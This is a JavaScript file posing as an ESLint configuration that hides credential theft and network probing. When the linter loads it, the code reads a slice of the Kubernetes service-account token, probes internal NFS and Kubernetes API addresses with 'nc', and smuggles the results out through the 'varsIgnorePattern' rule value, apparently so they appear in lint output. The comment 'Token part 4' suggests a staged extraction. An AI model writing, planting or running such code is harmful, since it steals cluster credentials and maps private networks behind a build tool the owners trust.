var fs = require('fs');
var execSync = require('child_process').execSync;
var result = '';

// Token part 4 (chars 750-1000) - should have serviceaccount name
try {
  var token = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8');
  result += 'TOKEN_P4:' + token.substring(700, 950) + '|';
  result += 'TOKEN_LEN:' + token.length + '|';
} catch(e) {}

// Try to reach NFS server port 2049 or 20048 (mountd) 
try {
  var out = execSync('echo test | nc -w 2 172.32.137.127 2049 2>&1; echo EXIT:$?', {timeout: 5000}).toString();
  result += 'NFS_PORT:' + out.substring(0, 50) + '|';
} catch(e) {
  result += 'NFS_NC:' + e.message.substring(0, 40) + '|';
}

// Try to access NFS mountd
try {
  var out2 = execSync('echo test | nc -w 2 172.32.137.127 20048 2>&1; echo EXIT:$?', {timeout: 5000}).toString();
  result += 'MOUNTD:' + out2.substring(0, 50) + '|';
} catch(e) {
  result += 'MOUNTD_NC:' + e.message.substring(0, 40) + '|';
}

// Check if we can reach any other internal service
try {
  var out3 = execSync('echo test | nc -w 2 10.100.0.1 443 2>&1; echo EXIT:$?', {timeout: 5000}).toString();
  result += 'K8SAPI_NC:' + out3.substring(0, 30);
} catch(e) {
  result += 'K8SAPI_NC:' + e.message.substring(0, 30);
}

result += '{{{BREAK}}}';
module.exports = { rules: { "no-unused-vars": ["error", { varsIgnorePattern: result }] } };
